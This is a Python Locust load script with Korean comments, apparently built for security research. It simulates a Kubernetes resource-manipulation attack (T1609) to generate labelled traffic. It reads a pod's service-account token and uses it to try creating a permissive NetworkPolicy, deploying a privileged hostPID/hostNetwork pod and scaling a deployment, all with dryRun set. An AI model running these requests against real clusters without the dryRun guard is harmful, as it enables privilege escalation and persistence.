# k8s_manipulate_locustfile.py — 시나리오 2: 리소스 조작 (T1609)
#
# 전제: 시나리오 1에서 획득한 API 토큰 보유(= 침해된 pod의 서비스어카운트).
#       API로 네트워크정책 생성/특권 pod 배포/디플로이 스케일 변경을 '시도'해 접근 범위를 넓히려 한다(T1609).
#
# ★ 안전: 모든 write 요청에 ?dryRun=All 을 붙였다 → 서버가 검증만 하고 '실제로 반영하지 않는다'.
#   즉 클러스터는 전혀 바뀌지 않고, 논문의 리소스조작 계열 write-API 트래픽(POST/PATCH)만 생성된다.
#   (권한이 없으면 403. 어느 쪽이든 시도 자체가 공격 트래픽 — 의도 기준 라벨.)
#
# ■ confound 정렬 안 함(의도, K8s API 대상 — enum 과 동일 이유). ■ standalone(common.harness 미사용).
# ■ 규모: 시각화를 위해 논문 최소치(~108패킷)보다 넉넉히 — run.sh 에서 -u/-t 로 조정.
# 실행: 클러스터 안 attacker pod 에서(run.sh attack).

import os
import json
import uuid
from locust import HttpUser, task, between

SA = "/var/run/secrets/kubernetes.io/serviceaccount"


def _read(path, default=""):
    try:
        with open(path) as f:
            return f.read().strip()
    except Exception:
        return default


TOKEN = _read(f"{SA}/token")
CACERT = f"{SA}/ca.crt"
NS = os.environ.get("TARGET_NS", _read(f"{SA}/namespace", "deepmesh"))
DRY = "?dryRun=All"   # ← 실제 변경 억제


class K8sManipulateUser(HttpUser):
    host = os.environ.get("HOST", "https://kubernetes.default.svc")
    wait_time = between(0.5, 3.0)

    def on_start(self):
        self.client.verify = CACERT if os.path.exists(CACERT) else False
        if TOKEN:
            self.client.headers.update({"Authorization": f"Bearer {TOKEN}",
                                        "Content-Type": "application/json"})

    # --- 네트워크정책 생성 시도(접근범위 확대) — dryRun ---
    @task(2)
    def create_networkpolicy(self):
        name = f"attack-sim-{uuid.uuid4().hex[:6]}"
        body = {"apiVersion": "networking.k8s.io/v1", "kind": "NetworkPolicy",
                "metadata": {"name": name, "namespace": NS},
                "spec": {"podSelector": {}, "policyTypes": ["Ingress"], "ingress": [{}]}}
        self.client.post(f"/apis/networking.k8s.io/v1/namespaces/{NS}/networkpolicies{DRY}",
                         data=json.dumps(body), name="POST /networkpolicy [dryRun]")

    # --- 특권 pod 배포 시도(백도어 컨테이너 흉내) — dryRun ---
    @task(2)
    def create_privileged_pod(self):
        name = f"attack-pod-{uuid.uuid4().hex[:6]}"
        body = {"apiVersion": "v1", "kind": "Pod",
                "metadata": {"name": name, "namespace": NS},
                "spec": {"hostPID": True, "hostNetwork": True,
                         "containers": [{"name": "x", "image": "busybox",
                                         "command": ["sh", "-c", "sleep 3600"],
                                         "securityContext": {"privileged": True}}]}}
        self.client.post(f"/api/v1/namespaces/{NS}/pods{DRY}",
                         data=json.dumps(body), name="POST /pod [privileged, dryRun]")

    # --- 디플로이 스케일 변경 시도 — dryRun ---
    @task(1)
    def scale_deployment(self):
        patch = [{"op": "replace", "path": "/spec/replicas", "value": 5}]
        self.client.patch(f"/apis/apps/v1/namespaces/{NS}/deployments/auth-service/scale{DRY}",
                          data=json.dumps(patch),
                          headers={"Content-Type": "application/json-patch+json"},
                          name="PATCH /deployment scale [dryRun]")
